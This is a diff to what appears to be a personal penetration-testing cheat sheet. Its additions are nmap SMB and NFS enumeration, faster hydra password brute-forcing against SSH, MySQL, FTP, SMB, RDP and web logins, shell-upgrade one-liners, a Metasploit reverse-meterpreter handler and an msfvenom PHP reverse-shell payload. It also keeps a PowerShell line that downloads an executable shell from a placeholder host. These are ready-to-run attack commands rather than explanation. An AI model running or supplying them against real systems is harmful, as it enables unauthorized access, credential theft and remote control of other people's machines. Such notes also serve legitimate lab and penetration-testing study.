@@ -9,7 +9,11 @@ $ find / -perm -u=s -type f 2>/dev/null
 $ find / -perm -4000 -exec ls -ldb {} \; 2> /dev/null # same as about but own by any user
 $ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null # both SUID and SUIG
 ```
-
+# nmap
+```console
+$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $IP #smb
+$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount $IP # rpcbind
+```
 # powershell
 ```
 powershell -command "IEX (New-Object System.Net.WebClient).Downloadfile('http://<ip>:<port>/shell2.exe','shell2.exe')"
@@ -31,18 +35,39 @@ root@kali:~# john -wordlist=/usr/share/wordlists/rockyou.txt <hash>
 ## hydra
 credit noxtal cheatsheet, check [here](https://noxtal.com/cheatsheets/2020/07/24/hydra-cheatsheet/)
 ```console
-$ hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP -t 4 ssh
-$ hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP mysql
-$ hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP ftp
-$ hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP smb
-$ hydra -l user -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/login.php:username=^USER^&password=^PASS^:Login Failed"
-$ hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' #wordpress
-$ hydra -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$IP
+$ hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP -t 64 ssh
+$ hydra -f -t 64 -l user -P /usr/share/wordlists/rockyou.txt $IP mysql
+$ hydra -f -t 64 -l user -P /usr/share/wordlists/rockyou.txt $IP ftp
+$ hydra -f -t 64 -l user -P /usr/share/wordlists/rockyou.txt $IP smb
+$ hydra -t 64 -l user -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/login.php:username=^USER^&password=^PASS^:Login Failed"
+$ hydra -f -t 64 -l user -P /usr/share/wordlists/rockyou.txt $IP -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' #wordpress
+$ hydra -f -t 64 -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$IP
 $ hydra -t 64 -l username -P /usr/share/wordlists/rockyou.txt pop3://$IP #pop3
 ```
 # Reverse SSH port forwarding
 ```console
 $ ssh -L <LPORT>:<RHOST>:<RPROT> <username>@$IP
+```
+
+# TTY shell
+```console
+$ python -c 'import pty; pty.spawn("/bin/sh")'
+$ echo os.system('/bin/bash')
+$ /bin/sh -i
+```
+# msfconsole
+## linux
+```
+use multi/handler
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+set LHOST [HOST IP]
+set LPORT [LISTENING_PORT]
+exploit
+```
+# msfvenom
+## php
+```
+msfvenom -p php/meterpreter/reverse_tcp lhost=tun0 lport=1234 R
 ```
 # curl
 ```console
